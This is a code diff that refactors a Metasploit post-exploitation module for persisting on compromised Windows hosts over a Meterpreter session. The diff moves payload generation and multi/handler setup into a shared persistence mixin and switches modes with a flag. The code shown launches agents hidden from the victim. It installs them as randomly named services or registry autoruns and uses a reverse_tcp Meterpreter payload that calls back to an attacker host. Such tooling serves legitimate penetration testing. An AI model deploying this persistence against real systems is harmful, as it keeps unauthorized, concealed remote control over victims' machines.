@@ -13,6 +13,7 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/common'
 require 'msf/core/post/file'
+require 'msf/core/post/persistence'
 require 'msf/core/post/windows/priv'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/services'
@@ -21,6 +22,7 @@ class Metasploit3 < Msf::Post
 
 	include Msf::Post::Common
 	include Msf::Post::File
+	include Msf::Post::Persistence
 	include Msf::Post::Windows::Priv
 	include Msf::Post::Windows::Registry
 	include Msf::Post::Windows::WindowsServices
@@ -45,31 +47,18 @@ class Metasploit3 < Msf::Post
 				],
 			'Version'       => '$Revision$',
 			'Platform'      => [ 'windows' ],
-			'Actions'       => [['TEMPLATE'], ['REXE']],
-			'DefaultAction' => 'TEMPLATE',
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
 		register_options(
 			[
-				OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
-				OptInt.new('LPORT', [true, 'Port for persistent payload to connect to.']),
-				OptInt.new('DELAY', [true, 'Delay in seconds for persistent payload to reconnect.', 5]),
 				OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
-				OptBool.new('HANDLER', [ false, 'Start a Multi/Handler to Receive the session.', true]),
-				OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
-				OptString.new('REXE',[false, 'The remote executable to use.','']),
-				OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
 				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
 			], self.class)
 
-		register_advanced_options(
-			[
-				OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",""]),
-				OptString.new('ENCODER', [false, "Encoder name to use for encoding.",]),
-				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.']),
-			], self.class)
+		deregister_options('RBATCHNAME','REXEPATH', 'KEEPALIVE')
 	end
+
 
 	# Run Method for when run command is issued
 	#-------------------------------------------------------------------------------
@@ -86,10 +75,11 @@ class Metasploit3 < Msf::Post
 		encoder = datastore['ENCODER']
 		iterations = datastore['ITERATIONS']
 		@clean_up_rc = ""
+		@rexe_mode = false
 		host,port = session.session_host, session.session_port
 		payload = "windows/meterpreter/reverse_tcp"
 
-		if  datastore['ACTION'] == 'TEMPLATE'
+		if datastore['REXE'].nil? or datastore['REXE'].empty?
 			# Check that if a template is provided that it actually exists
 			if datastore['TEMPLATE']
 				if not ::File.exists?(datastore['TEMPLATE'])
@@ -116,7 +106,8 @@ class Metasploit3 < Msf::Post
 			script = create_script(delay, template_pe, raw)
 			script_on_target = write_script_to_target(script)
 		else
-			if datastore['REXE'].nil? or datastore['REXE'].empty?
+			@rexe_mode = true
+			if datastore['REXE'].empty?
 				print_error("Please define REXE")
 				return
 			end
@@ -139,8 +130,8 @@ class Metasploit3 < Msf::Post
 		# Start handler if set
 		create_multihand(payload, lhost, lport) if datastore['HANDLER']
 
-		# Initial execution of script
-		target_exec(script_on_target)
+		# Initial execution of script if set
+		target_exec(script_on_target) if datastore['EXECUTE']
 
 		case datastore['STARTUP']
 		when /USER/i
@@ -170,56 +161,6 @@ class Metasploit3 < Msf::Post
 		)
 	end
 
-	# Generate raw payload
-	#-------------------------------------------------------------------------------
-	def pay_gen(pay,encoder, iterations)
-		raw = pay.generate
-		if encoder
-			if enc_compat(pay, encoder)
-				print_status("Encoding with #{encoder}")
-				enc = framework.encoders.create(encoder)
-				(1..iterations).each do |i|
-					print_status("\tRunning iteration #{i}")
-					raw = enc.encode(raw, nil, nil, "Windows")
-				end
-			end
-		end
-		return raw
-	end
-
-	# Check if encoder specified is in the compatible ones
-	#
-	# Note: This should allow to adapt to new encoders if they appear with out having
-	# to have a static whitelist.
-	#-------------------------------------------------------------------------------
-	def enc_compat(payload, encoder)
-		compat = false
-		payload.compatible_encoders.each do |e|
-			if e[0] == encoder.strip
-				compat = true
-			end
-		end
-		return compat
-	end
-
-	# Create a payload given a name, lhost and lport, additional options
-	#-------------------------------------------------------------------------------
-	def create_payload(name, lhost, lport, opts = "")
-
-		pay = session.framework.payloads.create(name)
-		pay.datastore['LHOST'] = lhost
-		pay.datastore['LPORT'] = lport
-		if not opts.empty?
-			opts.split(",").each do |o|
-				opt,val = o.split("=", 2)
-				pay.datastore[opt] = val
-			end
-		end
-		# Validate the options for the module
-		pay.options.validate(pay.datastore)
-		return pay
-
-	end
 
 	# Function for Creating persistent script
 	#-------------------------------------------------------------------------------
@@ -233,29 +174,6 @@ class Metasploit3 < Msf::Post
 		return vbs
 	end
 
-	# Function for creating log folder and returning log path
-	#-------------------------------------------------------------------------------
-	def log_file(log_path = nil)
-		#Get hostname
-		host = session.sys.config.sysinfo["Computer"]
-
-		# Create Filename info to be appended to downloaded files
-		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
-
-		# Create a directory for the logs
-		if log_path
-			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
-		else
-			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
-		end
-
-		# Create the log directory
-		::FileUtils.mkdir_p(logs)
-
-		#logfile name
-		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
-		return logfile
-	end
 
 	# Function for writing script to target host
 	#-------------------------------------------------------------------------------
@@ -270,66 +188,19 @@ class Metasploit3 < Msf::Post
 		return tempvbs
 	end
 
-	# Method for checking if a listener for a given IP and port is present
-	# will return true if a conflict exists and false if none is found
-	#-------------------------------------------------------------------------------
-	def check_for_listner(lhost,lport)
-		conflict = false
-		client.framework.jobs.each do |k,j|
-			if j.name =~ / multi\/handler/
-				current_id = j.jid
-				current_lhost = j.ctx[0].datastore["LHOST"]
-				current_lport = j.ctx[0].datastore["LPORT"]
-				if lhost == current_lhost and lport == current_lport.to_i
-					print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
-					conflict = true
-				end
-			end
-		end
-		return conflict
-	end
-
-	# Starts a multi/handler session
-	#-------------------------------------------------------------------------------
-	def create_multihand(payload,lhost,lport)
-		pay = session.framework.payloads.create(payload)
-		pay.datastore['LHOST'] = lhost
-		pay.datastore['LPORT'] = lport
-		print_status("Starting exploit multi handler")
-		if not check_for_listner(lhost,lport)
-			# Set options for module
-			mul = session.framework.exploits.create("multi/handler")
-			mul.share_datastore(pay.datastore)
-			mul.datastore['WORKSPACE'] = client.workspace
-			mul.datastore['PAYLOAD'] = payload
-			mul.datastore['EXITFUNC'] = 'thread'
-			mul.datastore['ExitOnSession'] = false
-			# Validate module options
-			mul.options.validate(mul.datastore)
-			# Execute showing output
-			mul.exploit_simple(
-					'Payload'     => mul.datastore['PAYLOAD'],
-					'LocalInput'  => self.user_input,
-					'LocalOutput' => self.user_output,
-					'RunAsJob'    => true
-				)
-		else
-			print_error("Could not start handler!")
-			print_error("A job is listening on the same Port")
-		end
-	end
 
 	# Function to execute script on target and return the PID of the process
 	#-------------------------------------------------------------------------------
 	def target_exec(script_on_target)
 		print_status("Executing script #{script_on_target}")
-		proc = datastore['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
+		proc = @rexe_mode == true ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
 		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
 
 		print_good("Agent executed with PID #{proc.pid}")
 		@clean_up_rc << "kill #{proc.pid}\n"
 		return proc.pid
 	end
+
 
 	# Function to install payload in to the registry HKLM or HKCU
 	#-------------------------------------------------------------------------------
@@ -343,6 +214,8 @@ class Metasploit3 < Msf::Post
 			print_error("Error: failed to open the registry key for writing")
 		end
 	end
+
+
 	# Function to install payload as a service
 	#-------------------------------------------------------------------------------
 	def install_as_service(script_on_target)
@@ -350,7 +223,7 @@ class Metasploit3 < Msf::Post
 			print_status("Installing as service..")
 			nam = Rex::Text.rand_text_alpha(rand(8)+8)
 			print_status("Creating service #{nam}")
-			datastore['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
+			@rexe_mode == true ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
 
 			@clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
 		else
@@ -372,9 +245,6 @@ class Metasploit3 < Msf::Post
 		return tempvbs
 	end
 
-	def create_payload_from_file(exec)
-		print_status("Reading Payload from file #{exec}")
-		return ::IO.read(exec)
-	end
+
 
 end
